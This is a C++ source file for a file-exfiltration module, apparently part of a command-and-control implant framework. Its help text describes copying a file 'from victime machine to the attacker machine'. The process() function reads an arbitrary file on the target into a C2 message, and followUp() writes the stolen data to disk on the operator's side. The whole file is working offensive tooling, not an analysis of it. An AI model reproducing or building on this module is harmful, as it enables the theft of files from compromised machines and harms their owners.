#include "Download.hpp"

#include <cstring>

using namespace std;


const std::string moduleName = "download";


#ifdef _WIN32

__declspec(dllexport) Download* DownloadConstructor() 
{
    return new Download();
}

#endif

Download::Download()
	: ModuleCmd(moduleName)
{
}

Download::~Download()
{
}

std::string Download::getInfo()
{
	std::string info;
	info += "download:\n";
	info += "Download a file from victime machine to the attacker machine\n";
	info += "exemple:\n";
	info += "- download c:\\temp\\toto.exe c:\\temp\\toto.exe\n";

	return info;
}

int Download::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
	if (splitedCmd.size() == 3)
	{
		string inputFile = splitedCmd[1];
		string outputFile = splitedCmd[2];

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_outputfile(outputFile);
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}

	return 0;
}


int Download::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	c2RetMessage.set_instruction(m_name);
	c2RetMessage.set_cmd("");
	c2RetMessage.set_inputfile(c2Message.inputfile());
	c2RetMessage.set_outputfile(c2Message.outputfile());

	std::string inputFile = c2Message.inputfile();
	std::ifstream input(inputFile, std::ios::binary);
	if( input ) 
	{
		std::string buffer(std::istreambuf_iterator<char>(input), {});
		c2RetMessage.set_returnvalue("Success.");
		c2RetMessage.set_data(buffer.data(), buffer.size());
	}
	else
	{
		c2RetMessage.set_returnvalue("Failed: Couldn't open file.");
	}

	return 0;
}


int Download::followUp(const C2Message &c2RetMessage)
{
	std::string outputFile = c2RetMessage.outputfile();
	std::ofstream output(outputFile, std::ios::binary);

	const std::string buffer = c2RetMessage.data();
	output << buffer;
	output.close();

	return 0;
}
